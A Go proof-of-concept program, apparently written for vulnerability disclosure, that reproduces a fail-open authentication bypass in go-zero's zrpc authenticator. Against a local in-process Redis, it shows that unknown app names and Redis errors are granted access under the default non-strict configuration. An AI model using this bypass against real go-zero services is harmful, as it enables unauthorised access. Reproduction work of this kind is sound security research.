// Command poc is the ZeroSesame exploit driver.
//
// It drives the REAL vulnerable go-zero v1.9.4 authentication code
// (github.com/zeromicro/go-zero/zrpc/internal/auth) against a faithful
// in-process Redis (miniredis — the same RESP-speaking backend the go-zero
// project's own auth regression tests use).
//
// The bug: with the default RpcServerConf (StrictControl unset -> false),
// auth.Authenticator.validate() returns nil (access GRANTED) whenever the
// Redis lookup fails — i.e. for an UNKNOWN app name, or ANY Redis backend
// error.  This is the "fails open" authentication bypass fixed (unreleased)
// by commit f56630376b819f56d1f71247af05fdf0c7f9e0ce.
package main

import (
	"context"
	"fmt"
	"os"

	"github.com/alicebob/miniredis/v2"
	"github.com/zeromicro/go-zero/core/stores/redis"
	"github.com/zeromicro/go-zero/zrpc/internal/auth"
	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/metadata"
	"google.golang.org/grpc/status"
)

func mkCtx(app, token string) context.Context {
	return metadata.NewIncomingContext(context.Background(),
		metadata.Pairs("app", app, "token", token))
}

type verdict struct {
	name     string
	app      string
	token    string
	wantOK   bool // true -> the caller SHOULD be authenticated (control)
	bypass   bool // true -> this is a bypass case that must NOT be allowed
	gotCode  string
	gotOK    bool
	correct  bool
}

func main() {
	// 1. Faithful Redis backend with a single legitimate app registered.
	mr := miniredis.NewMiniRedis()
	if err := mr.StartAddr("127.0.0.1:0"); err != nil {
		fmt.Fprintln(os.Stderr, "miniredis start failed:", err)
		os.Exit(2)
	}
	defer mr.Close()
	mr.HSet("apps", "legit-app", "s3cret-token")

	store := redis.New(mr.Addr())

	// 2. The REAL vulnerable authenticator.  `strict=false` is what a stock
	//    RpcServerConf produces (StrictControl is `json:",optional"` -> false).
	a, err := auth.NewAuthenticator(store, "apps", false)
	if err != nil {
		fmt.Fprintln(os.Stderr, "NewAuthenticator failed:", err)
		os.Exit(2)
	}

	rows := []verdict{
		{name: "valid_credentials", app: "legit-app", token: "s3cret-token", wantOK: true},
		{name: "wrong_token_known_app", app: "legit-app", token: "nope"},
		{name: "UNKNOWN_APP_BYPASS", app: "attacker", token: "anything-i-want", bypass: true},
		{name: "REDIS_OUTAGE_FAILOPEN", app: "victim-service", token: "no-token", bypass: true},
	}

	// 3. Evaluate the first three against the healthy Redis.
	for i := range rows {
		if rows[i].name == "REDIS_OUTAGE_FAILOPEN" {
			continue // handled separately below (needs an erroring backend)
		}
		rows[i].run(a)
	}

	// 4. Redis outage: inject a backend error so every lookup fails, then
	//    authenticate a completely unknown client.
	mr.SetError("ERR injected Redis outage")
	rows[3].run(a)
	mr.SetError("") // clear for any later use

	// 5. Report.
	fmt.Println("=== ZeroSesame: go-zero zrpc fail-open authentication bypass ===")
	bypassOK := true
	controlOK := true
	for _, r := range rows {
		fmt.Printf("[%-22s] app=%-14s token=%-14s -> %s (code=%s)\n",
			r.name, r.app, r.token, map[bool]string{true: "GRANTED", false: "DENIED"}[r.gotOK], r.gotCode)
		if r.bypass {
			if !r.gotOK {
				bypassOK = false
			}
		} else if r.wantOK != r.gotOK {
			controlOK = false
		}
	}

	// A legitimate wrong-token request is DENIED (proves auth does check tokens);
	// the two bypass cases are GRANTED (proves the fail-open hole).
	if controlOK && bypassOK {
		fmt.Println()
		fmt.Println("RESULT: AUTH BYPASS CONFIRMED — unknown app and Redis outage both")
		fmt.Println("        authenticate an unauthenticated caller (fails open).")
		return
	}
	fmt.Println()
	fmt.Println("RESULT: UNEXPECTED — reproduction incomplete, see table above.")
	os.Exit(1)
}

func (v *verdict) run(a *auth.Authenticator) {
	err := a.Authenticate(mkCtx(v.app, v.token))
	v.gotOK = err == nil
	if err != nil {
		v.gotCode = status.Code(err).String()
		if v.gotCode == codes.Unknown.String() {
			v.gotCode = fmt.Sprintf("unknown(%q)", err.Error())
		}
	} else {
		v.gotCode = "OK"
	}
	v.correct = (v.bypass && v.gotOK) || (!v.bypass && v.wantOK == v.gotOK)
}
